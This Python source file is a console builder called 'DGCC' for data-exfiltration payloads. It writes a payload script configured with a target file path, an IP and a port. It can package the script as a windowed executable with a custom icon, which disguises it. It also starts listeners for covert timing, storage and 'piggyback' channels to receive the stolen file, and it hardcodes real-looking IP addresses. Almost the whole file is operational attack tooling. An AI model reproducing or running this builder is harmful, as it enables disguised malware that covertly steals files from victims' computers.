#! python
##Lirbaries
from art import *
import sys
import os
import socket
import ListenerActiveStorage
import ListenerSocketTiming
import subprocess


filepath = "Hi.txt"
port = 12001
ip_addr = "138.47.130.215"
tar_ip = "138.47.138.176"

#########Front End of the Porgram (Console)
def console():
    tprint("DGCC", "rnd-large")
    name = "payload"
    icon = "Default"

    global filepath
    global port
    global tar_ip

    ##gets the ip address of the host
    global ip_addr

    print("type help for a list of commands")
    while(True):
        commands = input(">>").split()

        #prints the help command
        if(commands[0] == "help"):
            print("""
    help                             - gives the user a list of coammnds to use
    exit                             - quits out of the program
    filepath                         - give the program desired file path (Ex: Users\jackf\Desktop\Practice)
    status                           - gives the user specified path, HostIp
    reset                            - resets the given parameters
    delete [FP or ip or port]        - deletes one of the parameters in FN OR FP
    setIp                            - sets the IP
    settarIp                         - set target Ip
    setPort                          - sets the port
    name                             - sets the name of the payload
    icon [File.ico]                  - generate the icon for the paylaod (Needs to be in same directory as DGCC exe)
    run                              - give user the payload
                """)

        ##exist the program
        if(commands[0] == "settarIp"):
            tar_ip = commands[1]
            print("settarIp = " + str(tar_ip))
            print("")

        ##exist the program
        if(commands[0] == "exit"):
            quit()

        ##gives the user to be able to add the file path
        if(commands[0] == "filepath"):
            filepath = commands[1]
            print("filepath = " + str(filepath))
            print("")


        ## gives the user of the current parameters
        if(commands[0] == "status"):
            print("name = " + str(name))
            print("filepath = " + str(filepath))
            print("IP = " + str(ip_addr))
            print("Tar_IP = " + str(tar_ip))
            print("Port = " + str(port))
            print("Icon = " + str(icon))
            print("")


        if(commands[0] == "setIp"):
            ip_addr = commands[1]
            print("IP = " + str(ip_addr))
            print("")

        if(commands[0] == "name"):
            name = commands[1]
            print("name = " + str(name))
            print("")

        if(commands[0] == "setPort"):
            port = commands[1]
            print("Port = " + str(port))
            print("")

        if(commands[0] == "icon"):
            icon = commands[1]
            print("Icon = " + str(icon))
            print("")


        ## resets the parameters
        if(commands[0] == "reset"):
            filepath = ""
            name = "payload"
            icon = "Default"
            ip_addr = socket.gethostbyname(socket.gethostname())


        ##deletes an item in a list
        if(commands[0] == "delete"):
            if(commands[1] == "filepath" or commands[1] == "FP"):
                filepath = ""

            if(commands[1] == "ip"):
                ip_addr = ""

            if(commands[1] == "port"):
                port = 0

            else:
                print("invalid input for args[1]")
                continue

        ##cerates the payload
        if(commands[0] == "run"):
            return(filepath, name, ip_addr, port, icon)


def payload(fp, name, Ip, port):
    with open(str(name) + ".py", "w") as f:
        f.write("""
import DGCC

filepath = """ +  " r'"  +str(fp) +  "' " + """
Targetip = """ +  " '" + str(Ip) + "' " +"""
port = """ + str(port) + """

""")



def makeexe(name, icon):
    if(icon != "Default"):
        os.system('cmd /c pyinstaller --onefile --windowed --icon=' + str(icon)+'.ico '+str(name)+'.py')
    else:
        os.system('cmd /c pyinstaller --onefile --windowed '+str(name)+'.py')


    os.remove(str(name) + '.py')
    os.remove(str(name) + '.spec')
    #os.rmdir('/build')
    #os.rmdir('/__pycache__')


def liseners(ip, port, tar_ip):
    subprocess.Popen('python ListenerSocketTiming.py ' + str(tar_ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
    subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # active storage
    subprocess.Popen('PassiveServer.exe variables.txt ',creationflags=subprocess.CREATE_NEW_CONSOLE) # piggyback 

if __name__ == '__main__':
    noEXE = True

    (filepath, name, Ip, port, icon) = console()
    payload(filepath, name, Ip, port)

    if(not noEXE):
        makeexe(name, icon)
    else:
        with open("variables.txt", "w") as f:
            f.write(filepath + "\n")
            f.write(str(port) + "\n")
            f.write(ip_addr +"\n")

    liseners(Ip, port, tar_ip)
